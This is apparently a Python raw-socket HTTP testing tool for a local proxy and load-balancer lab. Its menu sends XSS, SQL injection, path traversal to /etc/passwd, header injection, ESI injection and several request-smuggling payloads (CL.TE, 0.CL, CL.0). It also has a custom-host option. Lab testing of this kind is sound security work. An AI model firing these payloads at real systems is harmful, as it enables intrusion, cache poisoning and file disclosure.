import socket
import ssl
import re
from dataclasses import dataclass
from urllib.parse import urlsplit

CRLF = b"\r\n"
HEADER_END = b"\r\n\r\n"
MAX_HEADER_BYTES = 64 * 1024
MAX_BODY_BYTES = 10 * 1024 * 1024

HTTP_VERSION_RE = re.compile(r"^HTTP/(1\.0|1\.1)$")
STATUS_CODE_RE = re.compile(r"^[0-9]{3}$")
TOKEN_RE = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")


class HTTPError(Exception):
    pass


@dataclass
class HTTPResponse:
    version: str
    status_code: int
    reason: str
    headers: list[tuple[str, str]]
    body: bytes


class HTTPReader:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buffer = b""

    def read_until(self, marker: bytes, limit: int) -> bytes:
        while marker not in self.buffer:
            if len(self.buffer) > limit:
                raise HTTPError("Headers grandes demais")

            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Conexão fechada antes do fim dos headers")

            self.buffer += chunk

        data, self.buffer = self.buffer.split(marker, 1)
        data += marker

        if len(data) > limit:
            raise HTTPError("Headers grandes demais")

        return data

    def read_exactly(self, n: int) -> bytes:
        if n > MAX_BODY_BYTES:
            raise HTTPError("Body grande demais")

        while len(self.buffer) < n:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Conexão fechada antes do body completo")
            self.buffer += chunk

        data = self.buffer[:n]
        self.buffer = self.buffer[n:]
        return data

    def read_line(self, limit: int) -> bytes:
        return self.read_until(CRLF, limit)


def get_values(headers, name):
    lname = name.lower()
    return [v for k, v in headers if k.lower() == lname]


def parse_comma(values):
    result = []
    for value in values:
        for item in value.split(","):
            item = item.strip()
            if item:
                result.append(item)
    return result


def parse_header_section(raw: bytes):
    if not raw.endswith(HEADER_END):
        raise HTTPError("Headers não terminam com CRLF CRLF")

    if b"\n" in raw.replace(b"\r\n", b""):
        raise HTTPError("LF isolado detectado")

    text = raw.decode("iso-8859-1")
    text = text[:-4]
    lines = text.split("\r\n")

    start_line = lines[0]
    headers = []

    for line in lines[1:]:
        if line == "":
            raise HTTPError("Linha vazia dentro dos headers")

        if line.startswith((" ", "\t")):
            raise HTTPError("obs-fold rejeitado")

        if ":" not in line:
            raise HTTPError(f"Header malformado: {line!r}")

        name, value = line.split(":", 1)

        if name != name.strip() or not TOKEN_RE.match(name):
            raise HTTPError(f"Nome de header inválido: {name!r}")

        headers.append((name.lower(), value.strip(" \t")))

    return start_line, headers


def parse_status_line(status_line: str):
    parts = status_line.split(" ", 2)

    if len(parts) < 2:
        raise HTTPError(f"Status-line inválida: {status_line!r}")

    version = parts[0]
    code = parts[1]
    reason = parts[2] if len(parts) == 3 else ""

    if not HTTP_VERSION_RE.match(version):
        raise HTTPError(f"Versão HTTP inválida na resposta: {version!r}")

    if not STATUS_CODE_RE.match(code):
        raise HTTPError(f"Status code inválido: {code!r}")

    return version, int(code), reason


def validate_content_length(values):
    if not values:
        return

    normalized = []

    for value in values:
        value = value.strip()

        if not value.isdigit():
            raise HTTPError(f"Content-Length inválido: {value!r}")

        n = int(value)

        if n > MAX_BODY_BYTES:
            raise HTTPError("Content-Length grande demais")

        normalized.append(str(n))

    if len(set(normalized)) != 1:
        raise HTTPError("Content-Length duplicado conflitante")


def validate_transfer_encoding(values):
    if not values:
        return

    codings = [c.lower() for c in parse_comma(values)]

    if not codings:
        raise HTTPError("Transfer-Encoding vazio")

    for coding in codings:
        if coding != "chunked":
            raise HTTPError(f"Transfer-Encoding não suportado: {coding!r}")

    if codings.count("chunked") > 1:
        raise HTTPError("Transfer-Encoding chunked duplicado")


def read_chunked_body(reader):
    body = bytearray()
    trailers = []

    while True:
        size_line = reader.read_line(1024)

        size_text = size_line[:-2].decode("ascii")
        size_part = size_text.split(";", 1)[0].strip()

        try:
            size = int(size_part, 16)
        except ValueError:
            raise HTTPError(f"Chunk-size inválido: {size_part!r}")

        if len(body) + size > MAX_BODY_BYTES:
            raise HTTPError("Body chunked grande demais")

        if size == 0:
            trailer_raw = bytearray()

            while True:
                line = reader.read_line(8192)
                if line == CRLF:
                    break
                trailer_raw += line

            if trailer_raw:
                fake = b"HTTP/1.1 200 OK\r\n" + bytes(trailer_raw) + b"\r\n"
                _, trailers = parse_header_section(fake)

            return bytes(body), trailers

        chunk = reader.read_exactly(size)
        ending = reader.read_exactly(2)

        if ending != CRLF:
            raise HTTPError("Chunk sem CRLF final")

        body.extend(chunk)


def response_has_no_body(status_code, request_method):
    if request_method.upper() == "HEAD":
        return True

    if 100 <= status_code < 200:
        return True

    if status_code in (204, 304):
        return True

    return False


def read_one_response(reader, request_method):
    raw_headers = reader.read_until(HEADER_END, MAX_HEADER_BYTES)
    status_line, headers = parse_header_section(raw_headers)
    version, status_code, reason = parse_status_line(status_line)

    cl = get_values(headers, "content-length")
    te = get_values(headers, "transfer-encoding")

    validate_content_length(cl)
    validate_transfer_encoding(te)

    if te and cl:
        cl = []

    if response_has_no_body(status_code, request_method):
        body = b""
    elif te:
        body, trailers = read_chunked_body(reader)
        if trailers:
            headers.extend((f"trailer-{k}", v) for k, v in trailers)
    elif cl:
        body = reader.read_exactly(int(cl[0]))
    else:
        chunks = []

        if reader.buffer:
            chunks.append(reader.buffer)
            reader.buffer = b""

        while True:
            chunk = reader.sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)

        body = b"".join(chunks)

    conn_tokens = [t.lower() for t in parse_comma(get_values(headers, "connection"))]
    should_close = "close" in conn_tokens or version == "HTTP/1.0"

    return HTTPResponse(version, status_code, reason, headers, body), should_close


def read_response(reader, request_method):
    responses = []
    should_close = False

    while True:
        resp, should_close = read_one_response(reader, request_method)
        responses.append(resp)

        if not (100 <= resp.status_code < 200):
            break

    return responses, should_close


def open_tcp(host, port, use_tls=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    if use_tls:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    return sock


def build_request(
    method,
    target,
    host_header,
    body=b"",
    chunked=False,
    extra_headers=None,
    close=True,
):
    extra_headers = extra_headers or []

    raw = f"{method} {target} HTTP/1.1\r\n".encode("iso-8859-1")
    raw += f"Host: {host_header}\r\n".encode("iso-8859-1")

    for k, v in extra_headers:
        raw += f"{k}: {v}\r\n".encode("iso-8859-1")

    if chunked:
        raw += b"Transfer-Encoding: chunked\r\n"
    elif body:
        raw += f"Content-Length: {len(body)}\r\n".encode("iso-8859-1")

    raw += b"Connection: close\r\n" if close else b"Connection: keep-alive\r\n"
    raw += CRLF

    if chunked:
        if body:
            raw += f"{len(body):X}\r\n".encode("ascii")
            raw += body + CRLF
        raw += b"0\r\n\r\n"
    else:
        raw += body

    return raw


def print_response(resp):
    print("\nResposta:")
    print(f"{resp.version} {resp.status_code} {resp.reason}")

    for k, v in resp.headers:
        print(f"{k}: {v}")

    print()
    print(resp.body.decode("utf-8", errors="replace"))


def send_raw(host, port, method, raw, use_tls=False):
    with open_tcp(host, port, use_tls=use_tls) as sock:
        reader = HTTPReader(sock)

        print("\nRequest Enviada")
        print(raw.decode("iso-8859-1", errors="replace"))

        sock.sendall(raw)

        responses, _ = read_response(reader, method)

        for resp in responses:
            print_response(resp)


def send_two_raw_same_connection(host, port, requests, use_tls=False):
    with open_tcp(host, port, use_tls=use_tls) as sock:
        reader = HTTPReader(sock)

        for method, raw in requests:
            print("\nRequest Enviada:")
            print(raw.decode("iso-8859-1", errors="replace"))

            sock.sendall(raw)

            responses, should_close = read_response(reader, method)

            for resp in responses:
                print_response(resp)

            if should_close:
                print("\n[cliente] conexão fechada pelo servidor/proxy")
                break

def send_raw_dump_all(host, port, raw, use_tls=False):
    with open_tcp(host, port, use_tls=use_tls) as sock:
        print("\nRequest Enviada:")
        print(raw.decode("iso-8859-1", errors="replace"))

        sock.sendall(raw)

        print("\nResposta:")

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break

            if not chunk:
                break

            print(chunk.decode("utf-8", errors="replace"), end="")

        print()

def manual_request():
    print("Digite a request raw. Finalize com END.")
    lines = []

    while True:
        line = input()
        if line == "END":
            break
        lines.append(line)

    text = "\r\n".join(lines)

    if not text.endswith("\r\n\r\n"):
        text += "\r\n\r\n"

    return text.encode("iso-8859-1")


def main():
    print("""
Destino:
1 - cadeia completa: security proxy 127.0.0.1:8080
2 - caching proxy direto 127.0.0.1:8081
3 - load balancer direto 127.0.0.1:8082
4 - servidor A direto 127.0.0.1:9001
5 - servidor B direto 127.0.0.1:9002
6 - servidor C direto 127.0.0.1:9003
7 - custom
""")

    dest = input("Escolha: ").strip()

    use_tls = False

    if dest == "0":
        host = "127.0.0.1"
        port = 8079
        host_header = "127.0.0.1:8079"

    elif dest == "1":
        host = "127.0.0.1"
        port = 8080
        host_header = "127.0.0.1:8080"

    elif dest == "2":
        host = "127.0.0.1"
        port = 8081
        host_header = "127.0.0.1:8081"

    elif dest == "3":
        host = "127.0.0.1"
        port = 8082
        host_header = "127.0.0.1:8082"

    elif dest == "4":
        host = "127.0.0.1"
        port = 9001
        host_header = "127.0.0.1:9001"

    elif dest == "5":
        host = "127.0.0.1"
        port = 9002
        host_header = "127.0.0.1:9002"

    elif dest == "6":
        host = "127.0.0.1"
        port = 9003
        host_header = "127.0.0.1:9003"

    elif dest == "7":
        host = input("Host [127.0.0.1]: ").strip() or "127.0.0.1"
        port = int(input("Porta: ").strip())
        host_header = input(f"Host header [{host}:{port}]: ").strip() or f"{host}:{port}"

    else:
        print("Opção inválida")
        return

    print("""
Testes:
1  - GET normal
2  - POST normal com Content-Length
3  - POST normal com chunked
4  - XSS simples
5  - SQLi simples
6  - Path traversal simples
7  - TE + CL
8  - múltiplos Content-Length divergentes
9  - obs-fold em Transfer-Encoding
10 - hop-by-hop header injection
11 - duas requests na mesma conexão
12 - tentativa CL.0 / request smuggling simples
13 - tentativa 0.CL / request smuggling simples
14 - cache MISS/HIT com duas requests iguais
15 - cache-busting com query diferente
16 - ESI include simples
17 - WebSocket Upgrade
18 - CONNECT
19 - request manual/raw
20 - tentativa de ESI Injection
21 - CL.TE request smuggling lab
""")

    op = input("Teste: ").strip()

    if op == "1":
        raw = build_request("GET", "/hello", host_header)
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "2":
        raw = build_request("POST", "/post-cl", host_header, body=b"HELLO")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "3":
        raw = build_request("POST", "/post-chunked", host_header, body=b"HELLO", chunked=True)
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "4":
        payload = b'name=<script>alert(1)</script>'
        raw = build_request(
            "POST",
            "/comment",
            host_header,
            body=payload,
            extra_headers=[("Content-Type", "application/x-www-form-urlencoded")],
        )
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "5":
        raw = build_request(
            "GET",
            "/search?q=' OR 1=1--",
            host_header,
        )
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "6":
        raw = build_request(
            "GET",
            "/download?file=../../../../etc/passwd",
            host_header,
        )
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "7":
        raw = (
            "POST /te-cl HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 4\r\n"
            "Connection: close\r\n"
            "\r\n"
            "5\r\nHELLO\r\n"
            "0\r\n\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "8":
        raw = (
            "POST /duplicate-cl HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Content-Length: 5\r\n"
            "Content-Length: 10\r\n"
            "Connection: close\r\n"
            "\r\n"
            "HELLO"
        ).encode("iso-8859-1")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "9":
        raw = (
            "POST /obs-fold HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Transfer-Encoding:\r\n"
            " chunked\r\n"
            "Connection: close\r\n"
            "\r\n"
            "5\r\nHELLO\r\n"
            "0\r\n\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "10":
        raw = (
            "GET /hop-by-hop HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Connection: X-Evil, close\r\n"
            "X-Evil: should-not-reach-backend\r\n"
            "X-Normal: should-reach-backend\r\n"
            "\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "11":
        req1 = build_request("GET", "/one", host_header, close=False)
        req2 = build_request("GET", "/two", host_header, close=True)
        send_two_raw_same_connection(host, port, [("GET", req1), ("GET", req2)], use_tls)

    elif op == "12":
        raw = (
            "POST /cl0 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Content-Length: 34\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "GET /smuggled-cl0 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "13":
        raw = (
            "POST /zero-cl HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n\r\n"
            "GET /smuggled-0cl HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "POST", raw, use_tls)

    elif op == "14":
        req1 = build_request("GET", "/cacheable?item=1", host_header, close=False)
        req2 = build_request("GET", "/cacheable?item=1", host_header, close=True)
        send_two_raw_same_connection(host, port, [("GET", req1), ("GET", req2)], use_tls)

    elif op == "15":
        req1 = build_request("GET", "/cacheable?item=1", host_header, close=False)
        req2 = build_request("GET", "/cacheable?item=2", host_header, close=True)
        send_two_raw_same_connection(host, port, [("GET", req1), ("GET", req2)], use_tls)

    elif op == "16":
        raw = build_request("GET", "/page-with-esi", host_header)
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "17":
        raw = (
            "GET /ws HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "GET", raw, use_tls)

    elif op == "18":
        raw = (
            "CONNECT 127.0.0.1:9001 HTTP/1.1\r\n"
            "Host: 127.0.0.1:9001\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("iso-8859-1")
        send_raw(host, port, "CONNECT", raw, use_tls)

    elif op == "19":
        raw = manual_request()
        method = raw.split(b" ", 1)[0].decode("ascii", errors="replace")
        send_raw(host, port, method, raw, use_tls)

    elif op == "20":
        payload = (
            "%3Cesi%3Ainclude%20src%3D%22%2Fsecret-fragment%22%20%2F%3E"
        )

        raw = (
            f"GET /reflect?q={payload} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("iso-8859-1")

        send_raw(host, port, "GET", raw, use_tls)
    elif op == "21":
        smuggled = (
            "GET /smuggled-clte HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("iso-8859-1")

        body = (
            b"0\r\n"
            b"\r\n"
            + smuggled
        )

        raw = (
            "POST /clte-lab HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Content-Length: " + str(len(body)) + "\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
        ).encode("iso-8859-1") + body

        send_raw_dump_all(host, port, raw, use_tls)
    else:
        print("Opção inválida")


if __name__ == "__main__":
    main()